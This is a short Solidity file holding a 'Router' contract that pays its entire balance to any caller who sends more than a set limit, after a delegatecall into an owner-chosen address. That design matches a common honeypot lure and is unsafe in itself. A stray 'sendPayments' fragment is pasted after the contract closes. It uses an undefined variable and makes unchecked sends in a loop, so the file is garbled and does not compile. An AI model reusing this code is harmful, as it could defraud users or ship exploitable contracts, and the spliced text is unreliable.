pragma solidity ^0.4.18;

contract Router
{
    address public Owner = msg.sender;
    address public DataBase;
    uint256 public Limit;


    function Set(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner);
        Limit = limit;
        DataBase = dataBase;
    }

    function()payable{}

    function transfer(address adr)
    payable
    {
        if(msg.value>Limit)
        {
            DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
            adr.transfer(this.balance);
        }
    }

}
	function sendPayments() public {
		for(uint i = 0; i < values.length - 1; i++) {
				msg.sender.send(msg.value);
		}
	}
}
